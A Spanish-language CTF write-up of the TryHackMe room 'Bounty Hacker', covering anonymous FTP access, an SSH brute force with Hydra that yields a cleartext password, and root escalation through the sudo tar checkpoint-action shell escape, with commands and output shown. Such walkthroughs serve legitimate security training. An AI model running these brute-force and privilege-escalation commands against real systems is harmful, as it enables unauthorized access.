---
title: Bounty Hacker
date: 2024-01-17 16:00 +/-0000
categories: TryHackMe Máquina
tags:
  - bountyhacker
  - tryhackme
  - easy
author: okud4
toc: true
---

## Reconocimiento

Empezamos investigando la máquina accediendo a su dirección ip por nuestro navegador, y como resultado, nos muestra una página web

![](/assets/img/capturas/bountyhacker/webpage.png)

Seguimos analizando su código, por si descubrimos algo interesante.

![](/assets/img/capturas/bountyhacker/webpage-code.png)

Hasta ahora no encontramos nada llamativo.

## Escaneo y Enumeración

Escaneamos la dirección IP con Nessus y analizamos los resultados obtenidos.

- Encontramos los puertos 21, 22 y 80:

![](/assets/img/capturas/bountyhacker/bountyports.png)

- Sitemap con los directorios encontrados a los que podemos acceder

![](/assets/img/capturas/bountyhacker/bountysitemap.png)

- Servidor Apache

![](/assets/img/capturas/bountyhacker/bountyapacheserver.png)

Accedemos a la carpeta `http://<ip server>/images/`y descargamos la foto `crew.jpg` para poder analizar su contenido. Existen varias herramientas, en este caso usare [AperiSolve](https://wwww.aperisolve.com). Tras analizar la imagen, no obtenemos nada importante.

Habíamos localizados dos puertos abiertos, el 21 (ftp) y el 22 (ssh).

#### **_FTP_**

Empezaremos a investigar el ftp, en busca de archivos que contengan información que nos pueda ser útil.

```bash
❯ ftp -v 10.10.165.251
Connected to 10.10.165.251.
220 (vsFTPd 3.0.3)
Name (10.10.165.251:okud4): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||44252|)
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
ftp> get locks.txt
local: locks.txt remote: locks.txt
229 Entering Extended Passive Mode (|||48913|)
150 Opening BINARY mode data connection for locks.txt (418 bytes).
100% |*********************|   418        1.72 MiB/s    00:00 ETA
226 Transfer complete.
418 bytes received in 00:00 (8.29 KiB/s)
ftp> get task.txt
local: task.txt remote: task.txt
229 Entering Extended Passive Mode (|||42990|)
150 Opening BINARY mode data connection for task.txt (68 bytes).
100% |*********************|    68      133.34 KiB/s    00:00 ETA
226 Transfer complete.
68 bytes received in 00:00 (1.34 KiB/s)
```

Ahora procedemos a ver el contenido de ambos archivos .txt

El archivo `locks.txt` parece ser posibles contraseñas y el archivo `task.txt` contiene la respuesta a una de las preguntas.

#### **_SSH_**

Ahora que tenemos una lista de usuarios, podemos acceder por ssh a nuestra máquina, pero nos falta obtener la clave, así que tenemos que conseguir el acceso por fuerza bruta usando #Hydra.

Pero antes de nada, volvemos a inspeccionar el contenido de la web en busca de algún dato importante. Vemos que el contenido es un dialogo entre cuatro personas... Tomaremos sus nombres, junto con el nombre de usuario que encontramos en `task.txt` y creamos un nuevo diccionario de nombres de usuario llamado `users.txt`. Este diccionario lo tomaremos junto con el archivo `locks.txt` para poder obtener el usuario y la clave de acceso para la conexión SSH.

```bash

❯ hydra -L users.txt -P locks.txt 10.10.244.57 ssh -t 4
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-17 19:44:12
[DATA] max 4 tasks per 1 server, overall 4 tasks, 130 login tries (l:5/p:26), ~33 tries per task
[DATA] attacking ssh://10.10.244.57:22/
[22][ssh] host: 10.10.244.57   login: lin   password: RedDr4gonSynd1cat3

```

## Explotación

Nos conectamos vía ssh al servidor con las credenciales que hemos obtenido anteriormente. Una vez dentro de el servidor, listamos los archivos que se encuentren dentro de la carpeta `~/Desktop` y obtenemos el archivo `user.txt` el cual contiene la primera flag.

![](/assets/img/capturas/bountyhacker/bountyfirstflag.png)

## Escalada de Privilegios

Usando el comando `sudo -l` nos proporciona la información necesaria para poder obtener el vector de ataque a través de los archivos binarios. Para ello, nos ayudamos de la página [GTFOBINS](https://gtfobins.github.io/gtfobins/tar/#sudo)

```bash
lin@bountyhacker:~/Desktop$ sudo -l
[sudo] password for lin:
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
<udo tar -cf /dev/null /dev/null --c                              </dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# whoami
root
# ls /root
root.txt
# cat /root/root.txt
```
